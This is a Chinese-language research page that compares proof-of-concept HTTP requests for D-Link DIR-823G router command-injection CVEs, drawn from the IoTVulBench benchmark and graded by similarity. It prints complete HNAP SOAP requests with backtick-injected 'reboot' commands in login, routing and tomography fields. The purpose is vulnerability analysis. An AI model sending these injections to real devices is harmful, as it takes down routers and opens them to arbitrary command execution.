---
layout: default
permalink: /DIR-823G.html
title: DIR-823G PoC 大块彩色对照
date: 2026-09-15
firmware: DIR-823G
source_note: "../../DIR-823G.md"
tags:
  - IoT漏洞挖掘
  - CVE
  - PoC相似性
---

# DIR-823G PoC 大块彩色对照

> [!warning] 仿真环境版本说明
> BM-2024-00002 对应 DIR-823G A1 v1.0.2B03；BM-2024-00083 对应 DIR-823G v1.0.2B05。CVE-2019-15528/15529/15530、CVE-2020-25367/25368 的 NVD 描述指向 V1.0.2B05，但其中部分 seed 挂在 BM-2024-00002；环境与描述存在版本错配，复现时以实际镜像版本为准。

<span style="color:#17803d;font-weight:700">绿色文字/边框：原始请求主体的公共部分。</span>　<span style="color:#c2410c;font-weight:700">橙色文字：原始请求中确实不同的地方。</span>　<span style="color:#b91c1c;font-weight:700">红色标题：相似度高。</span>

## <span style="color:#b91c1c">A 级：CVE-2019-7297 ↔ CVE-2022-43109</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-7297</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-7297/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 442</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/<span style="color:#c2410c;font-weight:700">GetWanSettings</span>"</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Accept-Language: zh-CN,zh;q=0.9</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'&gt;  &lt;soap:Body&gt;    &lt;SetNetworkTomographySettings xmlns='http://purenetworks.com/HNAP1/'&gt;      <span style="color:#c2410c;font-weight:700">&lt;Address&gt;;'`reboot`';&lt;/Address&gt;</span>      <span style="color:#c2410c;font-weight:700">&lt;Number&gt;4&lt;/Number&gt;</span>          <span style="color:#c2410c;font-weight:700">&lt;Size&gt;4&lt;/Size&gt;</span>     &lt;/SetNetworkTomographySettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化 1：SOAPAction 头为 GetWanSettings。变化 2：Address 使用 ;'&#96;reboot&#96;';，Number=4、Size=4。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2022-43109</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2022-43109/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST http://TARGET_HOST:PORT/HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 416</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/<span style="color:#c2410c;font-weight:700">SetNetworkTomographySettings</span>"</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Accept-Language: zh-CN,zh;q=0.9</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<span style="color:#c2410c;font-weight:700">SetNetworkTomographySettings</span> xmlns="http://purenetworks.com/HNAP1/"&gt;<span style="color:#c2410c;font-weight:700">&lt;Address&gt;www.'`reboot`'.com&lt;/Address&gt;</span><span style="color:#c2410c;font-weight:700">&lt;Number&gt;5&lt;/Number&gt;</span><span style="color:#c2410c;font-weight:700">&lt;Size&gt;64&lt;/Size&gt;</span>&lt;/<span style="color:#c2410c;font-weight:700">SetNetworkTomographySettings</span>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化 1：SOAPAction 头为 SetNetworkTomographySettings。变化 2：Address 使用 www.'&#96;reboot&#96;'.com，Number=5、Size=64。</div>
</td>
</tr>
</table>

<span style="color:#b91c1c;font-weight:700">判定：请求 Body 的操作名和 Address 注入位置高度一致，属于同接口高相似组；SOAPAction、数字参数和地址包装必须保留为差异。</span>

来源：[CVE-2019-7297 原始请求](#CVE-2019-7297)、[CVE-2022-43109 原始请求](#CVE-2022-43109)。

## <span style="color:#c2410c">B 级：CVE-2019-13128 ↔ CVE-2019-15528</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2019-13128</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13128/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 544</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.9</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate, br</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: keep-alive</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<span style="color:#c2410c;font-weight:700">SetStaticRouteSettings</span> xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<span style="color:#c2410c;font-weight:700">StaticClientInfoList</span>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.211;'<span style="color:#c2410c;font-weight:700">`reboot`</span>'&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.3&lt;/Gateway&gt;&lt;Interface&gt;lan&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<span style="color:#c2410c;font-weight:700">StaticClientInfoList</span>&gt;&lt;/<span style="color:#c2410c;font-weight:700">SetStaticRouteSettings</span>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：SOAPAction 为 GetWanCurrentStatus；列表名为 StaticClientInfoList；注入 IPAddress。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2019-15528</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15528/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.5</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Content-Type: text/xml; charset=utf-8</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Content-Length: 555</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Connection: close</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetStaticRouteSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<span style="color:#c2410c;font-weight:700">StaticRouteClientInfoLists</span>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.212&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.1&lt;/Gateway&gt;&lt;Interface&gt;<span style="color:#c2410c;font-weight:700">lan'`reboot`'</span>&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<span style="color:#c2410c;font-weight:700">StaticRouteClientInfoLists</span>&gt;&lt;/SetStaticRouteSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：SOAPAction 为 SetStaticRouteSettings；列表名为 StaticRouteClientInfoLists；注入 Interface。</div>
</td>
</tr>
</table>

<span style="color:#c2410c;font-weight:700">判定：同一 SetStaticRouteSettings 路由对象模板，但比 A 级多出 SOAPAction、列表名和注入字段差异，属于“明显相似”而不是逐字相同。</span>

来源：[CVE-2019-13128 原始请求](#CVE-2019-13128)、[CVE-2019-15528 原始请求](#CVE-2019-15528)。

## <span style="color:#b91c1c">A 级：CVE-2019-15529 ↔ CVE-2019-15530 ↔ CVE-2020-25367 ↔ CVE-2020-25368</span>

下面把四条原始 Login 请求按大块展示；公共的 Login XML 用绿色边框，四个注入点用橙色说明。

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-15529</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15529/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.5</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Content-Type: text/xml; charset=utf-8</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Content-Length: 452</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Connection: close</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;<span style="color:#c2410c;font-weight:700">&lt;Username&gt;Admin'`reboot`'&lt;/Username&gt;</span>&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">注入点：Username。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-15530</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15530/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.5</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Content-Type: text/xml; charset=utf-8</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Content-Length: 454</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Connection: close</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
&nbsp;
  <span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;<span style="color:#c2410c;font-weight:700">&lt;LoginPassword&gt;'`reboot`'&lt;/LoginPassword&gt;</span>&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">注入点：LoginPassword。</div>
</td>
</tr>
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2020-25367</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25367/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.5</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Content-Type: text/xml; charset=utf-8</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span>
<span style="color:#17803d">Content-Length: 439</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Content-Length: 439</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Connection: close</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;<span style="color:#c2410c;font-weight:700">&lt;Captcha&gt;'`reboot`'&lt;/Captcha&gt;</span>&lt;PrivateLogin&gt;&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">注入点：Captcha。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2020-25368</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25368/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.5</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate</span>
<span style="color:#17803d">Content-Type: text/xml; charset=utf-8</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span>
<span style="color:#17803d">Content-Length: 439</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Content-Length: 439</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Connection: close</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;<span style="color:#c2410c;font-weight:700">&lt;PrivateLogin&gt;'`reboot`'&lt;/PrivateLogin&gt;</span>&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">注入点：PrivateLogin。</div>
</td>
</tr>
</table>

<span style="color:#b91c1c;font-weight:700">判定：四条 Login XML 的字段顺序和整体 Body 几乎完全重复，只轮换 Username、LoginPassword、Captcha、PrivateLogin 四个注入点。</span>

> [!note] Seed 抓包格式特征
> CVE-2020-25367/25368 的重复 Content-Length: 439、CVE-2019-7297 的单引号 XML、CVE-2019-15530 body 行的两个前导空格均按 seed 原文保留，不是排版错误。
